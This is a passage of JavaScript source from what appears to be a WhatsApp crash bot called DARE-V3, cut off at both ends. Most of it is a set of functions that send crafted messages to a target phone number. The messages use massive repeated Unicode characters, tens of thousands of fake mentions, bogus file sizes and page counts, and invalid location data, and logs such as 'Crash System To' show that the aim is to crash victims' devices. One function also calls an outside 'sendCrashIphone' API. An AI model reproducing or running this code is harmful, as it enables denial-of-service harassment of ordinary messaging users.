"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
},
"productId": "28364464939807272",
"title": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟☠️ 𝐗⃰͜•" + "ꦾ".repeat(90000),
"description": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"currencyCode": "𝗫- ⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"priceAmount1000": "999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "0@s.whatsapp.net",
"contextInfo": {}
}
 }
}
}), { 
userJid: target, 
quoted: Null
});
await Dare.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });

} catch (error) {
console.error("Failed to send message:", error);
}
console.log(chalk.red.bold(`Crash System To ${target}`));
}

// beta function 
async function InfiNite(target, pic, Ptcp = true) {
	const jids = `_*~@2348089405509~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await Dare.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "SLAYER💥",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: 'SLAY-𝐁𝐔𝐑𝐒𝐓 💥' + ui + jids },
									contextInfo: {
										mentionedJid: ['2347041620617@s.whatsapp.net'],
										mentions: ['2347041620617@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["2347041620617@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
	
async function systemUi(target, Ptcp = false) {
    Dare.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "👋" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
};
async function bak2(target) {
  try {
    await Dare.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟🌸" +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg",
                              },
                            },
                            { upload: Dare.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟🌸",
                                url: "https://t.me/caywzzneh",
                                merchant_url: "https://t.me/caywzzneh",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟🌸",
                                sections: [
                                  {
                                    title: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟🌸",
                                    rows: [], // Kosong untuk menghilangkan pilihan
                                  },
                                ],
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟🌸",
                                title: "CRASH!",
                                id: ".slay",
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      }
    );

    console.log(chalk.red.bold("Crash System Device"));
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

async function Jade(target, ptcp = true) {
      let FlashD = "🌿͜͞⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟🌸" + "𑇂𑆵𑆴𑆿".repeat(50000) + "ꦽ".repeat(50000);
     await Dare.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: FlashD,
            url: "https://t.me/caywzzneh",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    
async function virailix(target) {
            try {
                const newcrash = await fetchJson('https://venomweb.site/i/sendCrashIphone?numero=' + target + '&total=1&apikey=xeonkey');
                console.log(chalk.green("Send Bug By ⃟⃟⃟⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟"));
                console.log(chalk.red("InVisible⚡"));
            } catch (error) {
                console.error("Error Fetching Crash:", error);
            }
        }
		//END FNC BUG\\
async function DocBug(target) {
 let virtex = "⚡𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡";
   Dare.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⚡𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `⚡𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "⚡𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟ 𝐈𝐦𝐮𝐭⚡" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await Dare.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: scar1,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Dare.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
		//=================================================//
/// xeon function but steal by badboi
async function newsLetter(zLoc, ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Dare.relayMessage(zLoc, ptcp, {
                    userJid: zLoc,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function SletterCrash(zLoc, ptcp = false) {
let virtex = "☆ virailixCrash" + "ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321763581234@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["6285805338638@s.whatsapp.net"],
                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': zLoc
			});
			await Dare.relayMessage(zLoc, messageContent.message, {
				'participant': {
					'jid': zLoc
				},
				'messageId': messageContent.key.id
		});
            console.log(chalk.red.bold('Crash System Device By ☆ virailixCrash'))
}
   async function XeonXRobust(zLoc, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await Dare.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
	}
  
     async function xeonHARD(zLoc, ptcp = false)
    {
          const gg = "ꦽ".repeat(10200);
          const ggg = "ꦿꦾ".repeat(10200);
          Dare.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await Dare.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await Dare.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
